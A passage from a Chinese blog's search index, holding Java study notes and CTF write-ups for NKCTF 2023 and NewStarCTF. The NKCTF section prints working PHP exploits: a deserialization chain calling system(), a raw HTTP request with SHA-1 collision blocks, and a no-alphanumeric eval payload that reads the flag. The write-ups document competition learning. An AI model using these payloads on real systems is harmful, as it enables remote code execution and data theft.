src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%89/%E5%9B%BE%E7%89%87-23-631x1024-172122076828220.png\" alt=\"图片-23-631x1024\"></p>\n<p>@Override</p>\n<ul>\n<li>是一个注解</li>\n<li>可以帮助我们检查重写方法的方法声明的正确性</li>\n</ul>\n<p>（8） <strong>方法重写注意事项</strong></p>\n<ul>\n<li>私有方法不能被重写（父类私有成员子类是不能继承的）</li>\n<li>子类方法访问权限不能更低（public&gt;默认&gt;私有）</li>\n</ul>\n<p>（9） <strong>Java继承中的注意事项</strong></p>\n<ul>\n<li>Java中类只支持单继承，不支持多继承</li>\n<li>Java中类支持多层继承</li>\n</ul>\n","categories":["编程语言学习"],"tags":["编程语言","Java"]},{"title":"Java学习记录(二)","url":"/2022/08/20/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BA%8C/","content":"<h2 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h2><ul>\n<li>IDEA的使用</li>\n<li>数组</li>\n<li>方法</li>\n<li>Debug</li>\n</ul>\n<h3 id=\"IDEA的使用\"><a href=\"#IDEA的使用\" class=\"headerlink\" title=\"IDEA的使用\"></a>IDEA的使用</h3><p>（1） <strong>基本介绍</strong></p>\n<ul>\n<li>IDEA是Java语言开发的集成环境</li>\n<li>集成环境：把代码编写、编译、执行、调试等多种功能综合到一起的开发工具。</li>\n</ul>\n<p>（2） <strong>IDEA中的项目结构</strong></p>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BA%8C/image-73-17212202695351.png\" alt=\"image-73\"></p>\n<p>（3） <strong>IDEA中内容辅助线和快捷键</strong></p>\n<ul>\n<li>快速生成语句：<ol>\n<li>快速生成main()方法：psvm，回车</li>\n<li>快速生成输出语句：sout，回车</li>\n</ol>\n</li>\n<li>内容辅助键：Ctrl+Alt+space（内容提示，补全代码等）</li>\n<li>快捷键：<ul>\n<li>注释：<ul>\n<li>单行注释：选中代码，Ctrl+&#x2F;，再次使用会取消注释</li>\n<li>多行注释：选中代码，Ctrl+Shift+&#x2F;，再次使用取消</li>\n</ul>\n</li>\n<li>格式化：Ctrl+Alt+L</li>\n</ul>\n</li>\n</ul>\n<p>（4） <strong>IDEA中的模块操作</strong></p>\n<ul>\n<li>新建模块</li>\n<li>删除模块</li>\n<li>导入模块</li>\n</ul>\n<h3 id=\"数组\"><a href=\"#数组\" class=\"headerlink\" title=\"数组\"></a>数组</h3><p>（1） <strong>数组定义格式</strong></p>\n<ul>\n<li>数组概述：数组是一种用于存储多个相同类型数据的存储模型</li>\n<li>数组的定义格式：<ul>\n<li>格式一：数组类型[] 变量名</li>\n<li>格式二：数据类型 变量名[]</li>\n</ul>\n</li>\n</ul>\n<p>（2） <strong>数组初始化概述</strong></p>\n<ul>\n<li>Java中在数组必须先初始化才能使用</li>\n<li>所谓初始化：就是为数组中的数组元素分配内存空间，并为每个数组元素赋值</li>\n</ul>\n<p>（3） <strong>数组初始化的方式</strong></p>\n<ul>\n<li><p>动态初始化</p>\n<ul>\n<li>初始化的时候只指定数组长度，由系统为数组分配初始值</li>\n<li>格式：数据类型[] 变量名 &#x3D; new 数据类型[数组长度];</li>\n</ul>\n</li>\n<li><p>静态初始化</p>\n<ul>\n<li>初始化时指定每个数组元素的初始值，由系统决定数组长度</li>\n<li>格式：数据类型[] 变量名 &#x3D; new 数据类型[]{数据1,数据2,数据3,……};</li>\n</ul>\n</li>\n</ul>\n<p>（4） <strong>数组元素访问</strong></p>\n<ul>\n<li>数组内部保存的数据的访问方式：数组名[索引]</li>\n<li>索引是数组中数据的编号方式</li>\n<li>作用：索引用于访问数组中的数据使用，数组名[索引]等同于变量名，是一种特殊的变量名</li>\n<li>特征1：索引从0开始</li>\n<li>特征2：索引是连续的</li>\n<li>特征3：索引逐一增加的，每次加1</li>\n</ul>\n<p>（5） <strong>内存分配</strong></p>\n<ul>\n<li>概述：Java程序在运行时，需要在内存中分配空间。为了提高运算效率，就对空间进行了不同区域的划分，因为每一片区域都有特定的处理数据方式和内存管理方式。</li>\n<li>数组在初始化时，会为存储空间添加默认值<ul>\n<li>整数：默认是0</li>\n<li>浮点数：默认是0.0</li>\n<li>布尔值：默认为false</li>\n<li>字符：默认值为空字符</li>\n<li>引用数据类型：默认值为<code>null</code></li>\n</ul>\n</li>\n<li>栈内存：存储局部变量<ul>\n<li>定义在方法中的变量，例如：arr</li>\n<li>使用完毕，立即消失</li>\n</ul>\n</li>\n<li>堆空间：存储new出来的内容（实体，对象）<ul>\n<li>数组在初始化时，会为存储空间添加默认值</li>\n<li>每一个new出来的东西都有一个地址值</li>\n<li>使用完毕，会在垃圾回收器空闲时被回收</li>\n</ul>\n</li>\n</ul>\n<p>（6） <strong>数组操作的两个小问题</strong></p>\n<ul>\n<li>索引越界：访问了数组中不存在的索引对应的元素，造成索引越界问题</li>\n<li>空指针异常：访问的数组已经不再指向堆内存的数据，造成空指针异常</li>\n<li>null：空值，引用数据类型的默认值，表示不指向任何有效对象</li>\n</ul>\n<p>（7） <strong>数组常见操作</strong></p>\n<ul>\n<li>遍历：使用for循环进行遍历操作</li>\n<li>获取数组元素的个数：数组名.<code>length</code></li>\n</ul>\n<h3 id=\"方法\"><a href=\"#方法\" class=\"headerlink\" title=\"方法\"></a>方法</h3><p>（1） <strong>方法概述</strong></p>\n<ul>\n<li>方法：是将有独立功能的<code>代码块</code>组织成为一个整体，使其具有特殊功能的<code>代码集</code></li>\n<li>注意：<ul>\n<li>方法必须先创建才可以使用，该过程称为方法定义</li>\n<li>方法创建后并不是直接运行的，需要手动使用后才执行，该过程称为方法调用</li>\n</ul>\n</li>\n</ul>\n<p>（2） <strong>方法的定义和调用</strong></p>\n<ul>\n<li><p>定义格式：<br><code>public static void 方法名()&#123;   //方法体   &#125;</code></p>\n</li>\n<li><p>调用格式：<code>方法名();</code></p>\n</li>\n</ul>\n<p>（3） <strong>方法练习</strong></p>\n<p>需求：设计一个方法用于打印两个数中的较大数</p>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BA%8C/index-1024x879-17212202839342.png\" alt=\"index-1024x879\"></p>\n<p>（4） <strong>带参数方法的定义和调用</strong></p>\n<ul>\n<li>带参数方法定义<ul>\n<li>格式：<code>public static void 方法名(参数)&#123;……&#125;</code></li>\n<li>格式（单个参数）：<code>public static void 方法名(数据类型 变量名)&#123;……&#125;</code></li>\n<li>格式（多个参数）：<code>public static void 方法名(数据类型 变量名1，数据类型 变量名2，……)&#123;……&#125;</code></li>\n<li>注意：<ul>\n<li>方法定义时，参数中的<code>数据类型</code>与<code>变量名</code>都不能缺少，缺少任意一个程序将报错</li>\n<li>方法定义时，多个参数之间使用逗号（,）分隔</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>带参数的方法调用<ul>\n<li>格式：<code>方法名(参数);</code></li>\n<li>格式（单个参数）：<code>方法名(变量名/变量值);</code></li>\n<li>格式（多个参数）：<code>方法名(变量名1/常量值1,变量名2/常量值2);</code></li>\n<li>注意：<ul>\n<li>方法调用时，参数的数量与类型必须与方法定义中的设置相匹配，否则程序将报错</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>演示代码：</li>\n</ul>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BA%8C/image-74-1024x545-17212202944353.png\" alt=\"image-74-1024x545\"></p>\n<p>（5） <strong>形参和实参</strong></p>\n<ul>\n<li>形参：方法定义中的参数，等同于变量定义格式</li>\n<li>实参：方法调用中的参数，等同于使用变量或常量</li>\n</ul>\n<p>（6） <strong>带返回值方法的定义和调用</strong></p>\n<ul>\n<li>带返回值方法定义<ul>\n<li><p>格式：<br><code>public static 数据类型 方法名(参数)&#123;   return 数据;   &#125;</code></p>\n</li>\n<li><p>注意：</p>\n<ul>\n<li>方法定义时return后面的返回值与方法定义上的数据类型要匹配，否则程序将报错</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>带返回值方法调用<ul>\n<li>格式1：<code>方法名(参数);</code></li>\n<li>格式2：<code>数据类型 变量名 = 方法名(参数);</code></li>\n<li>注意：<ul>\n<li>方法的返回值通常会使用变量接收，否则该返回值将无意义</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>演示代码：</li>\n</ul>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BA%8C/image-75-1024x546-17212203056174.png\" alt=\"image-75-1024x546\"></p>\n<p>（7） <strong>方法的注意事项</strong></p>\n<ul>\n<li>方法不能嵌套定义</li>\n<li>void表示无返回值，可以省略return，也可以单独的书写return，后面不加数据</li>\n</ul>\n<p>（8） <strong>方法的通用格式</strong></p>\n<ul>\n<li>格式：<ul>\n<li><p><code>public static 返回值类型 方法名(参数)&#123;   方法体;   return 数据;   &#125;</code></p>\n</li>\n<li><p>public static：修饰符</p>\n</li>\n<li><p>返回值类型：方法操作完毕之后返回的数据的数据类型，如果方法操作完毕，没有数据返回，这里就写void，而且方法中一般不写return</p>\n</li>\n<li><p>方法名：调用方法时使用的标识</p>\n</li>\n<li><p>参数：由数据类型和变量名组成，多个参数之间使用逗号隔开</p>\n</li>\n<li><p>方法体：完成功能的代码块</p>\n</li>\n<li><p>return：然后方法操作完毕，有数据返回，用于把数据返回给调用者</p>\n</li>\n</ul>\n</li>\n<li>定义方法时，要做到<code>两个明确</code>：<ul>\n<li>明确返回值类型：主要是明确方法操作完毕之后是否有数据返回，如果没有，写void；如果有，写对应的数据类型</li>\n<li>明确参数：主要是明确参数的类型和数量</li>\n</ul>\n</li>\n<li>调用方法时：<ul>\n<li>void类型的方法，直接调用即可</li>\n<li>非void类型的方法，推荐用变量接收调用</li>\n</ul>\n</li>\n</ul>\n<p>（9） <strong>方法重载</strong></p>\n<ul>\n<li>方法重载概述：方法重载指同一个类中定义的多个方法之间的关系，满足下列条件的多个方法相互构成重载<ul>\n<li>多个方法在同一个类中</li>\n<li>多个方法具有相同的方法名</li>\n<li>多个方法的参数不相同，类型不同或者数量不同</li>\n</ul>\n</li>\n<li>方法重载的特点：<ul>\n<li>重载仅对应方法的定义，与方法的调用无关，调用方式参照标准格式</li>\n<li>重载仅对同一类中方法的名称与参数进行识别，与返回值无关，换句话说不能通过返回值来判定两个方法是否相互构成重载</li>\n</ul>\n</li>\n</ul>\n<p>（10） <strong>方法的参数传递</strong></p>\n<ul>\n<li>方法参数传递（基本类型）<ul>\n<li>对于基本数据类型的参数，形式参数的改变，不影响实际参数的值</li>\n</ul>\n</li>\n<li>方法参数传递（引用类型）<ul>\n<li>对于引用类型的参数，形式参数的改变，影响实际参数的值</li>\n</ul>\n</li>\n<li>案例1：数组遍历<ul>\n<li>需求：设计一个方法用于数据遍历，要求遍历的结果是在一行上的。例如：[11,22,33,44,55]</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BA%8C/image-76-1024x542-17212203155335.png\" alt=\"image-76-1024x542\"></p>\n<h3 id=\"Debug\"><a href=\"#Debug\" class=\"headerlink\" title=\"Debug\"></a>Debug</h3><p>（1） <strong>Debug概述</strong></p>\n<ul>\n<li>Debug：是供程序员使用的程序调试工具，他可以用于<code>查看程序</code>的<code>执行流程</code>，也可以用于追踪程序执行过程来<code>调试程序</code>。</li>\n<li>Debug操作流程：<ul>\n<li>Debug调试，又被称为断点调试，断电其实是一个标记，告诉我们从哪里开始查看</li>\n<li>如何加断点：选择要设置断点的代码行，在行号的区域后面单击鼠标左键即可。</li>\n<li>如何运行加了断点的程序</li>\n<li>看哪里</li>\n<li>点哪里：F7</li>\n<li>如何删除断点：左键删除</li>\n</ul>\n</li>\n</ul>\n<p>（2） <strong>Dubug求偶数和</strong></p>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BA%8C/image-77-1024x542-17212203253326.png\" alt=\"image-77-1024x542\"></p>\n","categories":["编程语言学习"],"tags":["编程语言","Java"]},{"title":"Java学习记录(四)","url":"/2022/09/08/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E5%9B%9B/","content":"<h2 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h2><ul>\n<li>修饰符</li>\n</ul>\n<h3 id=\"修饰符\"><a href=\"#修饰符\" class=\"headerlink\" title=\"修饰符\"></a>修饰符</h3><p>（1） <strong>包的概述和使用</strong></p>\n<ul>\n<li>其实就是文件夹</li>\n<li>作用：对类进行分类管理</li>\n<li>包的定义格式：<ul>\n<li>格式：<code>package包名</code>（多级包用.分开）</li>\n<li>例子：package com.test;</li>\n</ul>\n</li>\n</ul>\n<p>带包的Java类编译和执行</p>\n<ul>\n<li>手动建包：<ul>\n<li>按照以前的格式编译java文件 javac HelloWorld.java</li>\n<li>手动创建包 在E盘建立文件夹com，然后在com下建立文件夹test</li>\n<li>把class文件放在包的里面 把HelloWorld.class文件放在com的test文件夹下</li>\n<li>带包执行 java com.test.HelloWorld</li>\n</ul>\n</li>\n<li>自动建包：javac -d HelloWorld.java java com.test.HelloWorld</li>\n</ul>\n<p>（2） <strong>导包</strong></p>\n<ul>\n<li>导包的概述和使用：为了简化带包的操作，Java就提供了导包的功能</li>\n<li>导包的格式：<ul>\n<li>格式：import 包名;</li>\n<li>例子：import cn.test.Teacher;</li>\n</ul>\n</li>\n</ul>\n<p>（3） <strong>修饰符</strong></p>\n<p>修饰符分类：</p>\n<ul>\n<li>权限修饰符</li>\n</ul>\n<p>修饰符| 同一个类中| 同一个包中  </p>\n<p>子类无关类| 不同包的子类| 不同包的无关类<br>—|—|—|—|—<br>private| √| | |<br>默认| √| √| |<br>protected| √| √| √|<br>public| √| √| √| √  </p>\n<ul>\n<li><p>状态修饰符</p>\n<ul>\n<li>final（最终态）：final关键字是最终的意思，可以修饰成员方法、成员变量、类<ul>\n<li>final修饰的特点：<ul>\n<li>修饰方法：表明该方法是最终方法，不能被重写</li>\n<li>修饰变量：表明该变量是常量，不能再次被赋值</li>\n<li>修饰类：表明该类是最终类，不能被继承</li>\n</ul>\n</li>\n<li>final修饰局部变量<ul>\n<li>变量是基本类型：final修饰指的是基本类型的数据值不能发生改变</li>\n<li>变量是引用类型：final修饰指的是引用类型的地址值不能发生改变，但是地址里面的内容是可以发生改变的</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>static（静态）：</p>\n</li>\n</ul>\n","categories":["编程语言学习"],"tags":["编程语言","Java"]},{"title":"NKCTF 2023","url":"/2023/03/27/NKCTF-2023/","content":"<h2 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h2><h3 id=\"baby-php\"><a href=\"#baby-php\" class=\"headerlink\" title=\"baby_php\"></a>baby_php</h3><pre><code>&lt;?php\nerror_reporting(0);\n\nclass Welcome\n&#123;\n    public $name;\n    public $arg = &#39;oww!man!!&#39;;\n\n    public function __construct()\n    &#123;\n        $this-&gt;name = &#39;ItS SO CREAZY&#39;;\n    &#125;\n\n    public function __destruct()\n    &#123;\n        if ($this-&gt;name == &#39;welcome_to_NKCTF&#39;) &#123;\n            echo $this-&gt;arg;\n        &#125;\n    &#125;\n&#125;\n\nfunction waf($string)\n&#123;\n    if (preg_match(&#39;/f|l|a|g|\\*|\\?/i&#39;, $string)) &#123;\n        die(&quot;you are bad&quot;);\n    &#125;\n&#125;\n\nclass Happy\n&#123;\n    public $shell;\n    public $cmd;\n\n    public function __invoke()\n    &#123;\n        $shell = $this-&gt;shell;\n        $cmd = $this-&gt;cmd;\n        waf($cmd);\n        eval($shell($cmd));\n    &#125;\n&#125;\n\nclass Hell0\n&#123;\n    public $func;\n\n    public function __toString()\n    &#123;\n        $function = $this-&gt;func;\n        $function();\n    &#125;\n&#125;\n\nif (isset($_GET[&#39;p&#39;])) &#123;\n    unserialize($_GET[&#39;p&#39;]);\n&#125; else &#123;\n    highlight_file(__FILE__);\n&#125; \n?&gt;\n</code></pre>\n<p>exp如下：</p>\n<pre><code>&lt;? phperror_reporting(0);\n\nclass Welcome\n&#123;\n    public $name;\n    public $arg;\n\n    public function __construct()\n    &#123;\n        $this-&gt;name = new Hell0();\n    &#125;\n&#125;\n\nfunction waf($string)\n&#123;\n    if (preg_match(&#39;/f|l|a|g|\\*|\\?/i&#39;, $string)) &#123;\n        die(&quot;you are bad&quot;);\n    &#125;\n&#125;\n\nclass Happy\n&#123;\n    public $shell;\n    public $cmd;\n\n    public function __construct()\n    &#123;\n        $this-&gt;shell = &#39;system&#39;;\n        // flag*?\n        $this-&gt;cmd = &#39;cd /;more `php -r &quot;echo chr(102).chr(49).chr(97).chr(103);&quot;`&#39;;\n    &#125;\n\n    public function __invoke()\n    &#123;\n        $shell = $this-&gt;shell;\n        $cmd = $this-&gt;cmd;\n        waf($cmd);\n        eval($shell($cmd));\n    &#125;\n&#125;\n\nclass Hell0\n&#123;\n    public $func;\n\n    public function __construct()\n    &#123;\n        $this-&gt;func = new Happy();\n    &#125;\n&#125;\n\n$a = new Welcome();\necho urlencode(serialize($a));\n</code></pre>\n<p>直接打得到flag</p>\n<p><img src=\"/images/NKCTF-2023/image-44.png\"></p>\n<h3 id=\"eazy-php\"><a href=\"#eazy-php\" class=\"headerlink\" title=\"eazy_php\"></a>eazy_php</h3><p>考察点：</p>\n<ul>\n<li>md5的弱比较</li>\n<li>sha1的强比较</li>\n<li>intval函数绕过</li>\n<li>无数字字母代码执行</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if ($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;] &amp;&amp; md5($_GET[&#x27;a&#x27;]) == md5($_GET[&#x27;b&#x27;])) &#123;</span><br><span class=\"line\">    if ((string)$_POST[&#x27;c&#x27;] != (string)$_POST[&#x27;d&#x27;] &amp;&amp; sha1($_POST[&#x27;c&#x27;]) === sha1($_POST[&#x27;d&#x27;])) &#123;</span><br><span class=\"line\">        if ($_GET[&#x27;e&#x27;] != 114514 &amp;&amp; intval($_GET[&#x27;e&#x27;]) == 114514) &#123;</span><br><span class=\"line\">            if (isset($_GET[&#x27;NS_CTF.go&#x27;])) &#123;</span><br><span class=\"line\">                if (isset($_POST[&#x27;cmd&#x27;])) &#123;</span><br><span class=\"line\">                    if (!preg_match(&#x27;/[0-9a-zA-Z]/i&#x27;, $_POST[&#x27;cmd&#x27;])) &#123;</span><br><span class=\"line\">                        eval($_POST[&#x27;cmd&#x27;]);</span><br><span class=\"line\">                    &#125; else &#123;</span><br><span class=\"line\">                        die(&#x27;error!!!!!!&#x27;);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125; else &#123;</span><br><span class=\"line\">                    die(&#x27;error!!!!!&#x27;);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; else &#123;</span><br><span class=\"line\">                die(&#x27;error!!!!&#x27;);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            die(&#x27;error!!!&#x27;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        die(&#x27;error!!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    die(&#x27;error!&#x27;);</span><br><span class=\"line\">&#125; ?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>poc如下：</p>\n<pre><code>POST /?a[]=1&amp;b[]=2&amp;e=114514abc&amp;e=114514.1&amp;NS[CTF.go=ppp HTTP/1.1\nHost: f7a48c96-7abb-4031-b7ff-4a549b7a4708.node.yuzhian.com.cn:8000\nPragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://nkctf.yuzhian.com.cn:8000/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9Cookie: _ga=GA1.1.157109328.1679215836; _ga_KCSGQQ51ER=GS1.1.1679681787.5.1.1679687030.0.0.0Connection: closeContent-Type: application/x-www-form-urlencoded\nContent-Length: 1342\n\nc=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);\n</code></pre>\n<p><img src=\"/images/NKCTF-2023/image-45.png\"></p>\n<h3 id=\"webpagetest\"><a href=\"#webpagetest\" class=\"headerlink\" title=\"webpagetest\"></a>webpagetest</h3><p>webpagetest的RCE：<a href=\"https://xz.aliyun.com/t/11798\">https://xz.aliyun.com/t/11798</a></p>\n<p>直接按着这个打就可以得到flag了</p>\n<p><img src=\"/images/NKCTF-2023/image-46.png\"></p>\n<p>未来得及时写WP，感兴趣的师傅可以去看末初师傅发表的WP:<a href=\"https://blog.csdn.net/mochu7777777/article/details/129791917?spm=1001.2014.3001.5501\">NKCTF 2023 Writeup By<br>AheadSec</a></p>\n<p>本次的web题目整体难度算中等，xiaopi这题还是想不到，可能是接触的太少吧……</p>\n","categories":["web安全学习"],"tags":["比赛","CTF","web"]},{"title":"NewStarCTF 公开赛赛道 WEEK1 WP","url":"/2022/09/30/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/","content":"<p>唉，这真的是新生赛嘛……都是大神啊</p>\n<p>只做了几道题目，太菜了</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/%E5%9B%BE%E7%89%87-99.png\" alt=\"现在的我：我是废物\"></p>\n<h2 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h2><p>web很简单，欺负人啊……</p>\n<h4 id=\"HTTP\"><a href=\"#HTTP\" class=\"headerlink\" title=\"HTTP\"></a>HTTP</h4><p>直接传<code>?name=123</code>就可以了</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-116-1024x165.png\"></p>\n<p>key，key在源码当中</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-117-1024x476.png\"><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-118-1024x108.png\"></p>\n<p>需要验证身份</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-119-1024x505.png\"></p>\n<p>修改cookie的值</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-120-1024x533.png\"></p>\n<h4 id=\"Head-Header\"><a href=\"#Head-Header\" class=\"headerlink\" title=\"Head?Header!\"></a>Head?Header!</h4><p>使用插件传入UA头，值为CTF</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-121-1024x393.png\"></p>\n<p>使用插件传入referer头，值为ctf.com</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-122-1024x416.png\"></p>\n<p>传入XFF头，值为本地回环地址</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-123-1024x383.png\"></p>\n<p>得到flag</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-124-1024x148.png\"></p>\n<h4 id=\"我真的会谢\"><a href=\"#我真的会谢\" class=\"headerlink\" title=\"我真的会谢\"></a>我真的会谢</h4><p>他说flag被分为三部分了，查看robots.txt发现第一部分</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-125-1024x117.png\"></p>\n<p>查看源码</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-126-1024x162.png\"></p>\n<p>使用vim会留下文件，猜测是<code>.index.php.swp</code>，然后找到第二部分</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-127-1024x546.png\"></p>\n<p>最后一部分是在<code>www.zip</code>中，最后拼接可以得到flag</p>\n<h4 id=\"NotPHP\"><a href=\"#NotPHP\" class=\"headerlink\" title=\"NotPHP\"></a>NotPHP</h4><p>给出了源码</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-128-1024x303.png\"></p>\n<p>第一个使用data伪协议绕过</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-129-1024x457.png\"></p>\n<p>第二个md5比较使用数组绕过</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-130-1024x470.png\"></p>\n<p>第三个使用%0a绕过</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-131-1024x544.png\"></p>\n<p>最后执行命令得到flag，使用%0a绕过</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-132-1024x539.png\"></p>\n<h4 id=\"Word-For-You\"><a href=\"#Word-For-You\" class=\"headerlink\" title=\"Word-For-You\"></a>Word-For-You</h4><p>使用万能密码得到flag</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-133-1024x540.png\"></p>\n<h2 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h2><h4 id=\"Yesec-no-drumsticks-1\"><a href=\"#Yesec-no-drumsticks-1\" class=\"headerlink\" title=\"Yesec no drumsticks 1\"></a>Yesec no drumsticks 1</h4><p>lsb隐写，直接使用<code>zsteg</code>获得flag</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK1-WP/image-134-1024x540.png\"></p>\n<h4 id=\"qsdz’s-girlfriend-1\"><a href=\"#qsdz’s-girlfriend-1\" class=\"headerlink\" title=\"qsdz’s girlfriend 1\"></a>qsdz’s girlfriend 1</h4><p>提示是生日，直接爆破压缩包密码，直接爆破8位的数字</p>\n<p><img 